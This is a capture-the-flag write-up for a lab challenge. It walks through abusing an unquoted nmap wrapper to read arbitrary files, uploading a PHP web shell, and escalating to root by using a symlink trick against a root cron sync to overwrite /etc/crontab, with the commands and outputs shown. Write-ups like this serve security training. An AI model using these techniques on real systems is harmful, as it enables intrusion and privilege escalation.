# shadow route / misc

## Challenge Information

* Target: `194.102.62.175:20539`
* Initial credentials: `pilot:docking-request`
* Goal: identify the unauthorized beacon and retrieve the flag
* Final result: privilege escalation to `root` and successful flag extraction

***

## Analyze -- Initial Access

### Service Identification

```bash
nmap -sV -p20539 194.102.62.175
```

Output:

```
PORT      STATE SERVICE VERSION
20539/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
```

The challenge entry point was actually an SSH service.

### Restricted Shell Behavior

Login:

```bash
ssh -p 20539 pilot@194.102.62.175
# password: docking-request
```

Banner and help output:

```
★ HELIOS DOCKING PORT - CONNECTED ★
Welcome, pilot. Restricted terminal active.
Internal network detected: 127.13.37.0/24

AVAILABLE COMMANDS:
  nmap <target>
  help
  exit
```

The `pilot` user was restricted to `nmap`.

### Shell Wrapper Analysis

Wrapper script:

```bash
cat /usr/local/bin/pilot-shell.sh
```

Key finding:

* The command was executed as `/usr/bin/nmap $args` without quotes.
* That exposed wildcard expansion and arbitrary file reads via `-iL`.

***

## Analyze -- Internal Enumeration

### Host and Port Discovery

```bash
nmap 127.13.37.0/24 -sT -p 1-10000 --open -n -oG -
```

Relevant result:

* `127.13.37.123`
  * `8445/tcp` running Python `SimpleHTTPServer`
  * `9043/tcp` running Apache

Service scan:

```bash
nmap 127.13.37.123 -sV -p8445,9043 --open
```

Output:

```
8445/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.12)
9043/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
```

### Reading Web Files Through `nmap`

Path discovery:

```bash
nmap 127.13.37.1 /var/www/html/*
```

Exposed paths:

* `/var/www/html/index.html`
* `/var/www/html/cosmos-data`
* `/var/www/html/stargate`

Read source files:

```bash
nmap 127.13.37.1 -iL /var/www/html/stargate/index.php
nmap 127.13.37.1 -iL /var/www/html/stargate/dashboard.php
nmap 127.13.37.1 -iL /var/www/html/stargate/db_config.php
```

Important findings:

* `dashboard.php` uploaded files into `/var/www/html/cosmos-data/`
* `.php` uploads were allowed
* `db_config.php` exposed:
  * `sync_user = nova`
  * `sync_pass = <very long string>`
  * `sync_script = /home/nova/orbit-sync.sh`

### Recovering Web Credentials

Read the database initialization artifact:

```bash
nmap 127.13.37.1 -iL /tmp/init_db.sh
```

This revealed valid web credentials:

* `astrid / apollo1`

***

## Exploit -- Web Access and RCE

### SSH Port Forwarding

The restricted shell was too limited for convenient interaction, so SSH local forwarding was used:

```bash
ssh -N -L 18445:127.13.37.123:8445 -L 19043:127.13.37.123:9043 -p 20539 pilot@194.102.62.175
```

Verification:

```bash
curl -I http://127.0.0.1:19043/
curl -I http://127.0.0.1:18445/
```

Output:

```
HTTP/1.1 200 OK
Server: Apache/2.4.52 (Ubuntu)
...

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.10.12
...
```

### Login to Stargate

```bash
curl -i -c /tmp/helios.cookies -d 'username=astrid&password=apollo1' http://127.0.0.1:19043/stargate/
```

Output:

```
HTTP/1.1 302 Found
Location: dashboard.php
```

The credentials worked.

### Uploading a Web Shell

Payload:

```php
<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
```

Upload request:

```bash
curl -b /tmp/helios.cookies -F 'datafile=@/tmp/cmd.php;filename=cmd.php' -F 'upload_telemetry=1' http://127.0.0.1:19043/stargate/dashboard.php
```

RCE validation:

```bash
curl 'http://127.0.0.1:19043/cosmos-data/cmd.php?cmd=id'
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The upload yielded command execution as `www-data`.

***

## Analyze -- Post-Exploitation

### System Initialization Review

```bash
curl -s 'http://127.0.0.1:19043/cosmos-data/cmd.php?cmd=cat+/entrypoint.sh'
```

Critical observations from `/entrypoint.sh`:

* A root cron job executed every minute:
  * `* * * * * root /bin/bash /home/nova/orbit-sync.sh`
* `/var/log/orbit-sync.log` was world-writable
* Telemetry files were periodically copied through a sync pipeline

### Observing Sync Activity

```bash
curl -s 'http://127.0.0.1:19043/cosmos-data/cmd.php?cmd=tail+-n+20+/var/log/orbit-sync.log'
```

Typical output:

```
[... UTC] Orbital sync initiated...
[... UTC] Telemetry data synced: N files
[... UTC] Orbital sync complete.
```

### Confirming Root-Controlled Backup Output

```bash
curl -s 'http://127.0.0.1:19043/cosmos-data/cmd.php?cmd=ls+-la+/var/backups/telemetry'
```

Sample output:

```
-rw-r--r-- 1 root root ... /var/backups/telemetry/cmd.php
-rw-r--r-- 1 root root ... /var/backups/telemetry/telemetry.php
...
```

This confirmed that `root` was copying files from the attacker-controlled `cosmos-data` directory into `/var/backups/telemetry`.

***

## Exploit -- Privilege Escalation via Symlink Write Primitive

### Concept

If a file inside `/var/backups/telemetry` could first be created as a symlink to an existing system file, then a later sync cycle might overwrite the symlink target with attacker-controlled content from a regular source file of the same name.

### Phase 1: Create a Symlink in the Source Directory

Via the web shell:

```bash
ln -s /tmp/pwncheck /var/www/html/cosmos-data/syncprobe
```

After one cron cycle, the destination contained a root-owned symlink:

```
lrwxrwxrwx 1 root root ... /var/backups/telemetry/syncprobe -> /tmp/pwncheck
```

### Phase 2: Replace the Source Symlink with a Regular File

```bash
echo ROOT_WRITE_TEST_... > /var/www/html/cosmos-data/syncprobe
```

Once `/tmp/pwncheck` existed, the next sync cycle overwritten it successfully. This confirmed a usable root write primitive.

***

## Exploit -- Overwriting `/etc/crontab`

### Creating the Destination Symlink

```bash
ln -s /etc/crontab /var/www/html/cosmos-data/cronpwn
```

After the next sync cycle:

```
/var/backups/telemetry/cronpwn -> /etc/crontab
```

### Replacing the Source with Malicious Cron Content

Payload:

```cron
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root /bin/bash /tmp/runme.sh
* * * * * root /bin/bash /home/nova/orbit-sync.sh
```

After the following sync cycle, `/etc/crontab` was overwritten with attacker-controlled content:

```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root /bin/bash /tmp/runme.sh
* * * * * root /bin/bash /home/nova/orbit-sync.sh
```

***

## Exploit -- Root Command Execution and Flag Retrieval

### Creating the Root Payload

```bash
#!/bin/bash
id > /var/www/html/cosmos-data/rootid.txt
cat /root/root.txt > /var/www/html/cosmos-data/finalflag.txt 2>/var/www/html/cosmos-data/finalflag.err
cat /root/flag* /flag* 2>/dev/null > /var/www/html/cosmos-data/rootflag.txt
```

Saved as `/tmp/runme.sh`, then waited for cron execution.

### Proof of Root Execution

```bash
cat /var/www/html/cosmos-data/rootid.txt
```

Output:

```
uid=0(root) gid=0(root) groups=0(root)
```

### Final Flag

```bash
cat /var/www/html/cosmos-data/finalflag.txt
```

Output:

```
UVT{y0u_f0und_m3_1n_4_d4rk_c0rn3r_fr0m_4_sh4d0w_t3rm1n4l_h0peFully_y0U_WoUlD_r3MemBer_M3!!!_1_will_watch_yOur_m0v3s_frOm_h3r3}
```

***

## Exploit Chain Summary

{% stepper %}
{% step %}
SSH into the restricted `pilot` account.
{% endstep %}

{% step %}
Abuse `/usr/bin/nmap $args` for internal enumeration and arbitrary file reads.
{% endstep %}

{% step %}
Recover `astrid/apollo1` from an initialization artifact.
{% endstep %}

{% step %}
Use SSH local port forwarding to reach the internal web services.
{% endstep %}

{% step %}
Login to Stargate and upload a `.php` web shell for `www-data` RCE.
{% endstep %}

{% step %}
Analyze the root cron-based telemetry sync process.
{% endstep %}

{% step %}
Use the two-phase symlink primitive to overwrite `/etc/crontab`.
{% endstep %}

{% step %}
Execute a root-controlled payload and read the flag.
{% endstep %}
{% endstepper %}
